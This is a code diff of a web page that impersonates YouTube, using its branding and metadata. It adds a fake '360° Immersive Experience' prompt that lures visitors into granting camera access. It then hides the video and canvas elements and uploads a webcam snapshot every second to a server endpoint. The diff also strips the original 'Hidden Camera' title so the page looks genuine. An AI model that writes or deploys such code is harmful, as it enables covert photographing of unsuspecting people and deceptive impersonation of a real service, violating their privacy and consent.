@@ -1,38 +1,119 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>YouTube Fullscreen with Hidden Camera</title>
+  <title>YouTube</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="YouTube">
+  <meta property="og:description" content="YouTube is an American online video sharing platform owned by Google. YouTube was founded on February 14, 2005, by Chad Hurley, Jawed Karim, and Steve Chen who were all former employees of PayPal. Headquartered in San Bruno, California, it is the second-most-visited website in the world, after Google itself.">
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREzHdXIeLp1D6JpqoZNJzTy9ziJAOGVNnSjShuT4p8nA&s=10">
+  <meta property="og:url" content="https://www.youtube.com/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="YouTube">
+  <meta name="twitter:description" content="Experience the latest 360° interactive video content on YouTube.">
+  <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREzHdXIeLp1D6JpqoZNJzTy9ziJAOGVNnSjShuT4p8nA&s=10">
+
   <style>
+    /* Reset and Layout */
     html, body {
       margin: 0;
       padding: 0;
       height: 100%;
       overflow: hidden;
-      background: black;
+      background: #000;
+      font-family: "Roboto", Arial, sans-serif;
     }
+
+    /* Video Container */
     iframe {
       position: absolute;
-      top: 0; left: 0;
+      top: 0;
+      left: 0;
       width: 100%;
       height: 100%;
       border: none;
     }
+
+    /* Custom Permission Overlay */
+    #permission-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0f0f0f; /* YouTube Dark Mode Background */
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      text-align: center;
+      padding: 24px;
+    }
+
+    #permission-overlay img {
+      width: 140px;
+      margin-bottom: 24px;
+    }
+
+    #permission-overlay h2 {
+      font-size: 22px;
+      font-weight: 500;
+      margin-bottom: 12px;
+    }
+
+    #permission-overlay p {
+      font-size: 14px;
+      line-height: 1.5;
+      color: #aaa;
+      margin-bottom: 32px;
+      max-width: 320px;
+    }
+
+    #enable-btn {
+      background: #cc0000;
+      color: #fff;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 2px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      transition: background 0.2s;
+    }
+
+    #enable-btn:active {
+      background: #990000;
+    }
+
+    /* Hide technical elements */
     video, canvas {
       display: none;
     }
   </style>
 </head>
 <body>
-  <!-- Fullscreen YouTube -->
-  <iframe
-    src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=1"
-    allow="autoplay; encrypted-media"
+
+  <div id="permission-overlay">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" alt="YouTube Logo">
+    <h2>360° Immersive Experience</h2>
+    <p>To enable head-tracking and interactive 360° viewing, YouTube needs access to your device's Camera and Motion sensors.</p>
+    <button id="enable-btn">Allow & Play</button>
+  </div>
+
+  <iframe 
+    id="video-player"
+    src="https://www.youtube.com/embed/njSffibRets?autoplay=1&controls=1&rel=0&modestbranding=1" 
+    allow="autoplay; encrypted-media; gyroscope; accelerometer" 
     allowfullscreen>
   </iframe>
 
-  <!-- Hidden camera elements -->
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
@@ -40,16 +121,26 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const overlay = document.getElementById('permission-overlay');
+    const btn = document.getElementById('enable-btn');
 
-    async function startCamera() {
+    // Trigger permission on button click
+    btn.addEventListener('click', async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        // Request camera access
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user' } 
+        });
+        
         video.srcObject = stream;
+        
+        // Remove the overlay once access is granted
+        overlay.style.display = 'none';
 
-        // Send photo every 333ms (≈ 3 per second)
+        // Start snapshot cycle (1 photo every 1 second)
         setInterval(async () => {
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
           try {
             await fetch('/api/upload-photo', {
@@ -58,16 +149,16 @@
               body: JSON.stringify({ dataUrl })
             });
           } catch (err) {
-            console.error('Send error:', err);
+            console.error('Network error during upload');
           }
         }, 1000);
 
       } catch (err) {
-        console.error('Camera access error:', err);
+        // If they deny, you can show a fallback message
+        alert("The 360° experience is disabled. Please refresh and allow camera access to continue.");
+        console.error('Camera access denied:', err);
       }
-    }
-
-    startCamera();
+    });
   </script>
 </body>
 </html>
